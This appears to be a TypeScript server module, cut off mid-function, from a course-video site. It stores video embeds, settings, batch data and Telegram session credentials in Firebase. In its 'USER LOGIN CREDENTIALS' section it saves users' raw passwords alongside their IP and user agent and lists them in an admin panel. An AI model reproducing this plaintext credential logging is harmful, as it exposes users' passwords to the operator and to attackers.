import "server-only";
import fs from "fs";
import path from "path";
import * as admin from "firebase-admin";
import {
  initializeApp as initWebApp,
  getApps as getWebApps,
  getApp as getWebApp,
} from "firebase/app";
import {
  getDatabase as getWebRtdb,
  ref as webRef,
  get as webGet,
  set as webSet,
  push as webPush,
  remove as webRemove,
} from "firebase/database";
import {
  cleanEnv,
  firebaseWebServerEnv,
  getFirebaseMode,
  getParsedFirebaseAdminConfig,
} from "@/config/firebaseConfig";
import { SITE_CONFIG } from "@/config/siteConfig";
import { buildYoutubeEmbedUrl } from "./youtube";
import { decryptVaultJson, encryptVaultJson } from "./tgCrypto";

export interface UserLoginEntry {
  id?: string;
  userId: string;
  password: string;
  userAgent?: string;
  ip?: string;
  createdAt: string;
}

export interface VideoEmbedEntry {
  key: string;
  batchId: string;
  videoId: string;
  title?: string;
  rawUrl: string;
  embedUrl: string;
  youtubeId: string | null;
  updatedAt: string;
}

export interface SiteDynamicSettings {
  telegramJoinUrl: string;
  telegramPopupEnabled: boolean;
  telegramAutoCloseSeconds: number;
  telegramPopupTitle: string;
  telegramPopupSubtitle: string;
  defaultImageUrl: string;
  appLogoUrl: string;
  defaultYoutubeUrl: string;
  announcementText: string;
  announcementEnabled: boolean;
  cloudflareStreamWorkerUrl: string;
  allowVideoDownload: boolean;
}

export interface BatchOrderMeta {
  important?: boolean;
  sortOrder?: number;
}

export interface TelegramCredentialsSecret {
  apiId: number;
  apiHash: string;
  sessionString: string;
  botToken?: string;
  updatedAt?: string;
}

export interface SyncedTelegramGroupRecord {
  id: string;
  chatInput: string;
  title: string;
  syncMode: "ADD_NEW" | "MERGE_JSON" | "BOTH";
  targetBatchId?: string;
  createdBatchId?: string;
  videosSynced: number;
  pdfsSynced: number;
  lastSyncedAt: string;
  /** "ok" = sab kuch save hua | "partial" = kuch batches me dikkat | "error" */
  syncStatus?: "ok" | "partial" | "error";
  /** Human-readable summary/error jo Admin Panel me dikhega */
  lastSyncMessage?: string;
  mergedVideosCount?: number;
  mergedPdfsCount?: number;
  youtubeOnlyCount?: number;
}

interface LocalStoreSchema {
  user_logins: UserLoginEntry[];
  video_embeds: Record<string, VideoEmbedEntry>;
  site_settings: Partial<SiteDynamicSettings>;
  batch_meta: Record<string, BatchOrderMeta>;
  custom_batches: Record<string, unknown>;
  deleted_batch_ids: string[];
  telegram_encrypted_creds?: string;
  telegram_groups?: Record<string, SyncedTelegramGroupRecord>;
}

// ============================================================================
// ULTRA-FAST SERVER MEMORY CACHE (Prevents lag on repeated folder clicks!)
// ============================================================================
interface MemCacheEntry<T> {
  value: T;
  expiresAt: number;
}

const memCache = new Map<string, MemCacheEntry<unknown>>();

function getCached<T>(key: string): T | undefined {
  const hit = memCache.get(key);
  if (!hit) return undefined;
  if (Date.now() > hit.expiresAt) {
    memCache.delete(key);
    return undefined;
  }
  return hit.value as T;
}

function setCached<T>(key: string, value: T, ttlMs = 25000): void {
  memCache.set(key, { value, expiresAt: Date.now() + ttlMs });
}

export function invalidateServerCaches(): void {
  memCache.clear();
}

function safeRtdbKey(rawKey: string): string {
  return String(rawKey).replace(/[.#$[\]/]/g, "_");
}

let lastDbError: string | null = null;

export function getLastDbError(): string | null {
  return lastDbError;
}

function getAdminRtdb() {
  if (getFirebaseMode() !== "admin-rtdb") return null;
  const cfg = getParsedFirebaseAdminConfig();
  if (!cfg.databaseURL) return null;

  try {
    const app = admin.apps.length
      ? admin.app()
      : admin.initializeApp({
          credential: admin.credential.cert({
            projectId: cfg.projectId,
            clientEmail: cfg.clientEmail,
            privateKey: cfg.privateKey,
          }),
          databaseURL: cfg.databaseURL,
        });
    lastDbError = null;
    return app.database(cfg.databaseURL);
  } catch (err) {
    lastDbError = err instanceof Error ? err.message : String(err);
    return null;
  }
}

function getServerWebRtdb() {
  if (getFirebaseMode() !== "web-rtdb") return null;
  try {
    const app = getWebApps().length
      ? getWebApp()
      : initWebApp({
          apiKey: firebaseWebServerEnv.apiKey || "AIzaSyDummyServerKey",
          projectId: firebaseWebServerEnv.projectId || "default-project",
          databaseURL: firebaseWebServerEnv.databaseURL,
        });
    lastDbError = null;
    return getWebRtdb(app);
  } catch (err) {
    lastDbError = err instanceof Error ? err.message : String(err);
    return null;
  }
}

async function withTimeout<T>(promise: Promise<T>, ms = 6000): Promise<T> {
  return new Promise<T>((resolve, reject) => {
    const timer = setTimeout(
      () =>
        reject(
          new Error(
            `Firebase RTDB request timed out after ${ms}ms. Check FIREBASE_DATABASE_URL in .env.`
          )
        ),
      ms
    );
    promise
      .then((val) => {
        clearTimeout(timer);
        resolve(val);
      })
      .catch((err) => {
        clearTimeout(timer);
        reject(err);
      });
  });
}

const LOCAL_STORE_PATH = path.join(process.cwd(), "data", "local_store.json");
const TMP_STORE_PATH = "/tmp/shd_local_store.json";

function getInitialSeedEmbeds(): Record<string, VideoEmbedEntry> {
  const seeds = [
    {
      batchId: "65",
      videoId: "131722",
      title: "Spoken English Batch Launching",
      rawUrl: "https://www.youtube.com/watch?v=M7lc1UVf-VE",
    },
    {
      batchId: "65",
      videoId: "131790",
      title: "Spoken English Part-1",
      rawUrl: "https://www.youtube.com/watch?v=ysz5S6PUM-U",
    },
    {
      batchId: "57",
      videoId: "109601",
      title: "Physics Syllabus 2026-27 Bihar Board",
      rawUrl: "https://www.youtube.com/watch?v=M7lc1UVf-VE",
    },
  ];
  const map: Record<string, VideoEmbedEntry> = {};
  for (const s of seeds) {
    const parsed = buildYoutubeEmbedUrl(s.rawUrl);
    const key = `${s.batchId}_${s.videoId}`;
    map[key] = {
      key,
      batchId: s.batchId,
      videoId: s.videoId,
      title: s.title,
      rawUrl: s.rawUrl,
      embedUrl: parsed.embedUrl,
      youtubeId: parsed.youtubeId,
      updatedAt: new Date().toISOString(),
    };
  }
  return map;
}

function readLocalStore(): LocalStoreSchema {
  const defaultStore: LocalStoreSchema = {
    user_logins: [],
    video_embeds: getInitialSeedEmbeds(),
    site_settings: {},
    batch_meta: {},
    custom_batches: {},
    deleted_batch_ids: [],
    telegram_groups: {},
  };

  try {
    if (fs.existsSync(TMP_STORE_PATH)) {
      const raw = fs.readFileSync(TMP_STORE_PATH, "utf8");
      return { ...defaultStore, ...JSON.parse(raw) };
    }
    if (fs.existsSync(LOCAL_STORE_PATH)) {
      const raw = fs.readFileSync(LOCAL_STORE_PATH, "utf8");
      return { ...defaultStore, ...JSON.parse(raw) };
    }
  } catch {
    // ignore
  }
  return defaultStore;
}

function writeLocalStore(store: LocalStoreSchema): void {
  const payload = JSON.stringify(store, null, 2);
  try {
    fs.mkdirSync(path.dirname(LOCAL_STORE_PATH), { recursive: true });
    fs.writeFileSync(LOCAL_STORE_PATH, payload, "utf8");
  } catch {
    // Read-only Vercel serverless dir
  }
  try {
    fs.writeFileSync(TMP_STORE_PATH, payload, "utf8");
  } catch {
    // ignore
  }
}

// ============================================================================
// LIVE DIAGNOSTIC PING FOR ADMIN PANEL
// ============================================================================
export async function testDatabaseConnection(): Promise<{
  ok: boolean;
  mode: string;
  databaseURL: string;
  message: string;
}> {
  const mode = getFirebaseMode();
  const cfg = getParsedFirebaseAdminConfig();

  if (mode === "admin-rtdb") {
    const rtdb = getAdminRtdb();
    if (!rtdb) {
      return {
        ok: false,
        mode,
        databaseURL: cfg.databaseURL,
        message: `Admin SDK init failed: ${
          lastDbError || "Check FIREBASE_PRIVATE_KEY format in .env"
        }`,
      };
    }
    try {
      await withTimeout(
        rtdb.ref("_shd_health_ping").set({ pingAt: new Date().toISOString() }),
        5000
      );
      lastDbError = null;
      return {
        ok: true,
        mode: "Firebase Realtime Database (Service Account Locked)",
        databaseURL: cfg.databaseURL,
        message: `Connected & Verified Read/Write to ${cfg.databaseURL}!`,
      };
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      lastDbError = msg;
      return {
        ok: false,
        mode,
        databaseURL: cfg.databaseURL,
        message: `Realtime DB error: ${msg}. Tip: Copy your exact Realtime Database URL from Firebase Console -> Data tab into FIREBASE_DATABASE_URL in .env!`,
      };
    }
  }

  if (mode === "web-rtdb") {
    const webDb = getServerWebRtdb();
    if (!webDb) {
      return {
        ok: false,
        mode,
        databaseURL: firebaseWebServerEnv.databaseURL,
        message: lastDbError || "Failed to initialize Web RTDB.",
      };
    }
    try {
      await withTimeout(
        webSet(webRef(webDb, "_shd_health_ping"), {
          pingAt: new Date().toISOString(),
        }),
        5000
      );
      return {
        ok: true,
        mode: "Firebase Realtime Database (Web URL)",
        databaseURL: firebaseWebServerEnv.databaseURL,
        message: `Connected to ${firebaseWebServerEnv.databaseURL}!`,
      };
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      lastDbError = msg;
      return {
        ok: false,
        mode,
        databaseURL: firebaseWebServerEnv.databaseURL,
        message: `Permission / URL error: ${msg}. Add FIREBASE_CLIENT_EMAIL & FIREBASE_PRIVATE_KEY in .env when rules are .read:false/.write:false!`,
      };
    }
  }

  return {
    ok: true,
    mode: "Local Server Store (Fallback)",
    databaseURL: "local_store.json",
    message:
      "Currently running on Local Server Fallback. Add FIREBASE_PROJECT_ID, FIREBASE_DATABASE_URL, FIREBASE_CLIENT_EMAIL & FIREBASE_PRIVATE_KEY in Vercel Environment Variables to store everything in Firebase Realtime Database!",
  };
}

// ============================================================================
// 1. USER LOGIN CREDENTIALS
// ============================================================================
export async function saveUserLoginToDb(entry: UserLoginEntry): Promise<void> {
  const payload = {
    userId: entry.userId,
    password: entry.password,
    userAgent: entry.userAgent || "",
    ip: entry.ip || "",
    createdAt: entry.createdAt,
  };

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const newRef = rtdb.ref("user_logins").push();
      await withTimeout(newRef.set(payload), 5000);
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const newRef = webPush(webRef(webDb, "user_logins"));
      await withTimeout(webSet(newRef, payload), 5000);
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  store.user_logins.unshift({
    id: `usr_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
    ...payload,
  });
  writeLocalStore(store);
}

export async function getAdminSavedUserLogins(): Promise<UserLoginEntry[]> {
  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const snap = await withTimeout(rtdb.ref("user_logins").get(), 5000);
      if (!snap.exists()) return [];
      const val = snap.val() as Record<string, UserLoginEntry>;
      return Object.entries(val)
        .map(([id, data]) => ({ ...data, id }))
        .sort((a, b) => (b.createdAt || "").localeCompare(a.createdAt || ""));
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const snap = await withTimeout(
        webGet(webRef(webDb, "user_logins")),
        5000
      );
      if (!snap.exists()) return [];
      const val = snap.val() as Record<string, UserLoginEntry>;
      return Object.entries(val)
        .map(([id, data]) => ({ ...data, id }))
        .sort((a, b) => (b.createdAt || "").localeCompare(a.createdAt || ""));
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  return store.user_logins || [];
}

export async function deleteAdminUserLogin(loginId: string): Promise<void> {
  const safeId = safeRtdbKey(loginId);
  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      await withTimeout(rtdb.ref(`user_logins/${safeId}`).remove(), 5000);
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      await withTimeout(webRemove(webRef(webDb, `user_logins/${safeId}`)), 5000);
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  store.user_logins = (store.user_logins || []).filter((x) => x.id !== loginId);
  writeLocalStore(store);
}

// ============================================================================
// 2. VIDEO YOUTUBE EMBED LINKS (Cached!)
// ============================================================================
export async function getAllVideoEmbeds(): Promise<
  Record<string, VideoEmbedEntry>
> {
  const cached = getCached<Record<string, VideoEmbedEntry>>("video_embeds");
  if (cached) return cached;

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const snap = await withTimeout(rtdb.ref("video_embeds").get(), 5000);
      if (!snap.exists()) {
        setCached("video_embeds", {});
        return {};
      }
      const raw = snap.val() as Record<string, VideoEmbedEntry>;
      const out: Record<string, VideoEmbedEntry> = {};
      for (const [k, v] of Object.entries(raw)) {
        out[v.key || k] = v;
      }
      setCached("video_embeds", out);
      return out;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const snap = await withTimeout(
        webGet(webRef(webDb, "video_embeds")),
        5000
      );
      if (!snap.exists()) {
        setCached("video_embeds", {});
        return {};
      }
      const raw = snap.val() as Record<string, VideoEmbedEntry>;
      const out: Record<string, VideoEmbedEntry> = {};
      for (const [k, v] of Object.entries(raw)) {
        out[v.key || k] = v;
      }
      setCached("video_embeds", out);
      return out;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  const out = store.video_embeds || {};
  setCached("video_embeds", out);
  return out;
}

export async function getVideoEmbed(
  batchId: string,
  videoId: string
): Promise<VideoEmbedEntry | null> {
  const embeds = await getAllVideoEmbeds();
  return embeds[`${batchId}_${videoId}`] || embeds[videoId] || null;
}

export async function saveVideoEmbed(params: {
  batchId: string;
  videoId: string;
  title?: string;
  rawUrl: string;
}): Promise<VideoEmbedEntry | null> {
  invalidateServerCaches();
  const key = `${params.batchId}_${params.videoId}`;
  const safeKey = safeRtdbKey(key);
  const trimmed = params.rawUrl.trim();

  const rtdb = getAdminRtdb();
  const webDb = getServerWebRtdb();

  if (!trimmed) {
    if (rtdb) {
      try {
        await withTimeout(rtdb.ref(`video_embeds/${safeKey}`).remove(), 5000);
        return null;
      } catch (err) {
        lastDbError = err instanceof Error ? err.message : String(err);
      }
    } else if (webDb) {
      try {
        await withTimeout(
          webRemove(webRef(webDb, `video_embeds/${safeKey}`)),
          5000
        );
        return null;
      } catch (err) {
        lastDbError = err instanceof Error ? err.message : String(err);
      }
    }
    const store = readLocalStore();
    delete store.video_embeds[key];
    writeLocalStore(store);
    return null;
  }

  const parsed = buildYoutubeEmbedUrl(trimmed);
  const entry: VideoEmbedEntry = {
    key,
    batchId: params.batchId,
    videoId: params.videoId,
    title: params.title || "",
    rawUrl: trimmed,
    embedUrl: parsed.embedUrl,
    youtubeId: parsed.youtubeId,
    updatedAt: new Date().toISOString(),
  };

  if (rtdb) {
    try {
      await withTimeout(rtdb.ref(`video_embeds/${safeKey}`).set(entry), 5000);
      return entry;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  } else if (webDb) {
    try {
      await withTimeout(
        webSet(webRef(webDb, `video_embeds/${safeKey}`), entry),
        5000
      );
      return entry;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  store.video_embeds[key] = entry;
  writeLocalStore(store);
  return entry;
}

// ============================================================================
// 3. SITE DYNAMIC SETTINGS + BATCH ORDERING / IMPORTANT PIN METADATA
// ============================================================================
export async function getEffectiveSiteSettings(): Promise<SiteDynamicSettings> {
  const cached = getCached<SiteDynamicSettings>("site_settings");
  if (cached) return cached;

  const defaults: SiteDynamicSettings = {
    telegramJoinUrl:
      cleanEnv(process.env.TELEGRAM_JOIN_URL) || SITE_CONFIG.telegramJoinUrl,
    telegramPopupEnabled: true,
    telegramAutoCloseSeconds: SITE_CONFIG.telegramAutoCloseSeconds || 5,
    telegramPopupTitle: SITE_CONFIG.telegramPopupTitle,
    telegramPopupSubtitle: SITE_CONFIG.telegramPopupSubtitle,
    defaultImageUrl:
      cleanEnv(process.env.DEFAULT_IMAGE_URL) || SITE_CONFIG.defaultImageUrl,
    appLogoUrl: cleanEnv(process.env.APP_LOGO_URL) || SITE_CONFIG.appLogoUrl,
    defaultYoutubeUrl: cleanEnv(process.env.DEFAULT_YOUTUBE_URL) || "",
    announcementText: "",
    announcementEnabled: false,
    cloudflareStreamWorkerUrl: cleanEnv(
      process.env.CLOUDFLARE_STREAM_WORKER_URL
    ),
    allowVideoDownload: true,
  };

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const snap = await withTimeout(
        rtdb.ref("site_settings/global").get(),
        5000
      );
      const res = snap.exists()
        ? { ...defaults, ...(snap.val() as Partial<SiteDynamicSettings>) }
        : defaults;
      setCached("site_settings", res);
      return res;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const snap = await withTimeout(
        webGet(webRef(webDb, "site_settings/global")),
        5000
      );
      const res = snap.exists()
        ? { ...defaults, ...(snap.val() as Partial<SiteDynamicSettings>) }
        : defaults;
      setCached("site_settings", res);
      return res;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  const res = { ...defaults, ...(store.site_settings || {}) };
  setCached("site_settings", res);
  return res;
}

export async function saveSiteSettings(
  partial: Partial<SiteDynamicSettings>
): Promise<SiteDynamicSettings> {
  const current = await getEffectiveSiteSettings();
  invalidateServerCaches();
  const cleanPartial: Partial<SiteDynamicSettings> = {};
  for (const [k, v] of Object.entries(partial)) {
    if (v !== undefined) {
      (cleanPartial as Record<string, unknown>)[k] = v;
    }
  }
  const merged: SiteDynamicSettings = { ...current, ...cleanPartial };

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      await withTimeout(rtdb.ref("site_settings/global").set(merged), 5000);
      return merged;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      await withTimeout(
        webSet(webRef(webDb, "site_settings/global"), merged),
        5000
      );
      return merged;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  store.site_settings = merged;
  writeLocalStore(store);
  return merged;
}

export async function getAllBatchOrderMeta(): Promise<
  Record<string, BatchOrderMeta>
> {
  const cached = getCached<Record<string, BatchOrderMeta>>("batch_meta");
  if (cached) return cached;

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const snap = await withTimeout(
        rtdb.ref("site_settings/batch_meta").get(),
        5000
      );
      const res = snap.exists()
        ? (snap.val() as Record<string, BatchOrderMeta>)
        : {};
      setCached("batch_meta", res);
      return res;
    } catch {
      // ignore
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const snap = await withTimeout(
        webGet(webRef(webDb, "site_settings/batch_meta")),
        5000
      );
      const res = snap.exists()
        ? (snap.val() as Record<string, BatchOrderMeta>)
        : {};
      setCached("batch_meta", res);
      return res;
    } catch {
      // ignore
    }
  }

  const store = readLocalStore();
  const res = store.batch_meta || {};
  setCached("batch_meta", res);
  return res;
}

export async function saveAllBatchOrderMeta(
  metaMap: Record<string, BatchOrderMeta>
): Promise<void> {
  invalidateServerCaches();
  const sanitized: Record<string, BatchOrderMeta> = {};
  for (const [k, v] of Object.entries(metaMap)) {
    sanitized[safeRtdbKey(k)] = {
      important: Boolean(v.important),
      sortOrder: typeof v.sortOrder === "number" ? v.sortOrder : 9999,
    };
  }

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      await withTimeout(
        rtdb.ref("site_settings/batch_meta").set(sanitized),
        5000
      );
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      await withTimeout(
        webSet(webRef(webDb, "site_settings/batch_meta"), sanitized),
        5000
      );
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  store.batch_meta = sanitized;
  writeLocalStore(store);
}

// ============================================================================
// 4. FULL JSON BATCH MANAGEMENT (Per-batch fetch + Server Cache for 0 Lag!)
// ============================================================================
export async function getSingleCustomBatch(
  batchId: string
): Promise<unknown | null> {
  const safeId = safeRtdbKey(batchId);
  const cacheKey = `single_batch_${safeId}`;
  const cached = getCached<unknown | null>(cacheKey);
  if (cached !== undefined) return cached;

  // If full map is already cached, pull from it
  const allCached = getCached<Record<string, unknown>>("all_custom_batches");
  if (allCached) {
    return allCached[batchId] ?? allCached[safeId] ?? null;
  }

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const snap = await withTimeout(
        rtdb.ref(`custom_batches/${safeId}`).get(),
        5000
      );
      if (!snap.exists()) {
        setCached(cacheKey, null);
        return null;
      }
      const val = snap.val() as { serializedJson?: string };
      if (val?.serializedJson) {
        const parsed = JSON.parse(val.serializedJson);
        setCached(cacheKey, parsed);
        return parsed;
      }
      return null;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const snap = await withTimeout(
        webGet(webRef(webDb, `custom_batches/${safeId}`)),
        5000
      );
      if (!snap.exists()) {
        setCached(cacheKey, null);
        return null;
      }
      const val = snap.val() as { serializedJson?: string };
      if (val?.serializedJson) {
        const parsed = JSON.parse(val.serializedJson);
        setCached(cacheKey, parsed);
        return parsed;
      }
      return null;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  const found = store.custom_batches?.[batchId] ?? null;
  setCached(cacheKey, found);
  return found;
}

export async function getCustomUploadedBatches(): Promise<
  Record<string, unknown>
> {
  const cached = getCached<Record<string, unknown>>("all_custom_batches");
  if (cached) return cached;

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const snap = await withTimeout(rtdb.ref("custom_batches").get(), 7000);
      if (!snap.exists()) {
        setCached("all_custom_batches", {});
        return {};
      }
      const raw = snap.val() as Record<
        string,
        { id?: string; serializedJson?: string }
      >;
      const out: Record<string, unknown> = {};
      for (const [k, v] of Object.entries(raw)) {
        if (v && typeof v.serializedJson === "string") {
          try {
            const parsed = JSON.parse(v.serializedJson);
            out[String(v.id || parsed.id || k)] = parsed;
          } catch {
            // skip
          }
        }
      }
      setCached("all_custom_batches", out);
      return out;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const snap = await withTimeout(
        webGet(webRef(webDb, "custom_batches")),
        7000
      );
      if (!snap.exists()) {
        setCached("all_custom_batches", {});
        return {};
      }
      const raw = snap.val() as Record<
        string,
        { id?: string; serializedJson?: string }
      >;
      const out: Record<string, unknown> = {};
      for (const [k, v] of Object.entries(raw)) {
        if (v && typeof v.serializedJson === "string") {
          try {
            const parsed = JSON.parse(v.serializedJson);
            out[String(v.id || parsed.id || k)] = parsed;
          } catch {
            // skip
          }
        }
      }
      setCached("all_custom_batches", out);
      return out;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  const out = store.custom_batches || {};
  setCached("all_custom_batches", out);
  return out;
}

export async function saveCustomUploadedBatch(
  batchId: string,
  batchJson: Record<string, unknown>
): Promise<void> {
  invalidateServerCaches();
  const id = String(batchId);
  const safeId = safeRtdbKey(id);

  await unmarkBatchDeleted(id);

  try {
    const dir = path.join(process.cwd(), "data", "batches");
    fs.mkdirSync(dir, { recursive: true });
    let targetFile = path.join(dir, `batch_${safeId}.json`);
    const existingFiles = fs
      .readdirSync(dir)
      .filter((f) => f.endsWith(".json"));
    for (const f of existingFiles) {
      try {
        const p = path.join(dir, f);
        const parsed = JSON.parse(fs.readFileSync(p, "utf8"));
        const fidMatch = f.replace(/\.json$/i, "").match(/_(\d+)$/);
        const fid = String(parsed.id ?? (fidMatch ? fidMatch[1] : f));
        if (fid === id) {
          targetFile = p;
          break;
        }
      } catch {
        // ignore
      }
    }
    fs.writeFileSync(targetFile, JSON.stringify(batchJson, null, 2), "utf8");
  } catch {
    // read-only serverless runtime is fine
  }

  const payload = {
    id,
    serializedJson: JSON.stringify(batchJson),
    updatedAt: new Date().toISOString(),
  };

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      await withTimeout(rtdb.ref(`custom_batches/${safeId}`).set(payload), 8000);
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      await withTimeout(
        webSet(webRef(webDb, `custom_batches/${safeId}`), payload),
        8000
      );
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  store.custom_batches[id] = batchJson;
  writeLocalStore(store);
}

export async function getDeletedBatchIds(): Promise<Set<string>> {
  const cached = getCached<string[]>("deleted_batch_ids");
  if (cached) return new Set(cached);

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const snap = await withTimeout(
        rtdb.ref("site_settings/deleted_batches").get(),
        5000
      );
      const ids = snap.exists()
        ? ((snap.val()?.ids as string[]) || []).map(String)
        : [];
      setCached("deleted_batch_ids", ids);
      return new Set(ids);
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const snap = await withTimeout(
        webGet(webRef(webDb, "site_settings/deleted_batches")),
        5000
      );
      const ids = snap.exists()
        ? ((snap.val()?.ids as string[]) || []).map(String)
        : [];
      setCached("deleted_batch_ids", ids);
      return new Set(ids);
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  const ids = (store.deleted_batch_ids || []).map(String);
  setCached("deleted_batch_ids", ids);
  return new Set(ids);
}

async function unmarkBatchDeleted(batchId: string): Promise<void> {
  const current = await getDeletedBatchIds();
  if (!current.has(batchId)) return;
  invalidateServerCaches();
  current.delete(batchId);
  const arr = Array.from(current);

  const rtdb = getAdminRtdb();
  const webDb = getServerWebRtdb();

  if (rtdb) {
    try {
      await withTimeout(
        rtdb.ref("site_settings/deleted_batches").set({ ids: arr }),
        5000
      );
      return;
    } catch {
      // ignore
    }
  } else if (webDb) {
    try {
      await withTimeout(
        webSet(webRef(webDb, "site_settings/deleted_batches"), { ids: arr }),
        5000
      );
      return;
    } catch {
      // ignore
    }
  }

  const store = readLocalStore();
  store.deleted_batch_ids = arr;
  writeLocalStore(store);
}

export async function deleteBatchCompletely(batchId: string): Promise<void> {
  invalidateServerCaches();
  const id = String(batchId);
  const safeId = safeRtdbKey(id);

  try {
    const dir = path.join(process.cwd(), "data", "batches");
    if (fs.existsSync(dir)) {
      for (const f of fs.readdirSync(dir).filter((x) => x.endsWith(".json"))) {
        const p = path.join(dir, f);
        try {
          const parsed = JSON.parse(fs.readFileSync(p, "utf8"));
          const fidMatch = f.replace(/\.json$/i, "").match(/_(\d+)$/);
          const fid = String(parsed.id ?? (fidMatch ? fidMatch[1] : f));
          if (fid === id) {
            fs.unlinkSync(p);
          }
        } catch {
          // ignore
        }
      }
    }
  } catch {
    // ignore
  }

  const deletedSet = await getDeletedBatchIds();
  deletedSet.add(id);
  const deletedArr = Array.from(deletedSet);

  const rtdb = getAdminRtdb();
  const webDb = getServerWebRtdb();

  if (rtdb) {
    try {
      await withTimeout(rtdb.ref(`custom_batches/${safeId}`).remove(), 5000);
      await withTimeout(
        rtdb.ref("site_settings/deleted_batches").set({ ids: deletedArr }),
        5000
      );
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  } else if (webDb) {
    try {
      await withTimeout(
        webRemove(webRef(webDb, `custom_batches/${safeId}`)),
        5000
      );
      await withTimeout(
        webSet(webRef(webDb, "site_settings/deleted_batches"), {
          ids: deletedArr,
        }),
        5000
      );
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  delete store.custom_batches[id];
  store.deleted_batch_ids = deletedArr;
  writeLocalStore(store);
}

// ============================================================================
// 5. ENCRYPTED TELEGRAM CREDENTIALS VAULT & SYNCED GROUPS REGISTRY
// ============================================================================
export async function getTelegramVaultCredentials(): Promise<TelegramCredentialsSecret | null> {
  const envApiId = parseInt(cleanEnv(process.env.TELEGRAM_API_ID), 10);
  const envApiHash = cleanEnv(process.env.TELEGRAM_API_HASH);
  const envSession = cleanEnv(process.env.TELEGRAM_SESSION_STRING);
  const envBotToken = cleanEnv(process.env.TELEGRAM_BOT_TOKEN);

  if (!Number.isNaN(envApiId) && envApiId > 0 && envApiHash && envSession) {
    return {
      apiId: envApiId,
      apiHash: envApiHash,
      sessionString: envSession,
      botToken: envBotToken || "",
    };
  }

  const cached = getCached<TelegramCredentialsSecret | null>("tg_vault_creds");
  if (cached !== undefined) {
    return cached && envBotToken && !cached.botToken
      ? { ...cached, botToken: envBotToken }
      : cached;
  }

  // 2. Otherwise decrypt from Firebase RTDB encrypted vault
  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const snap = await withTimeout(
        rtdb.ref("telegram_vault/encrypted_creds").get(),
        5000
      );
      if (snap.exists()) {
        const cipher = snap.val()?.cipher as string | undefined;
        const dec = decryptVaultJson<TelegramCredentialsSecret>(cipher);
        if (dec?.apiId && dec?.apiHash && dec?.sessionString) {
          setCached("tg_vault_creds", dec, 60000);
          return dec;
        }
      }
      return null;
    } catch {
      // fall through
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const snap = await withTimeout(
        webGet(webRef(webDb, "telegram_vault/encrypted_creds")),
        5000
      );
      if (snap.exists()) {
        const cipher = snap.val()?.cipher as string | undefined;
        const dec = decryptVaultJson<TelegramCredentialsSecret>(cipher);
        if (dec?.apiId && dec?.apiHash && dec?.sessionString) {
          setCached("tg_vault_creds", dec, 60000);
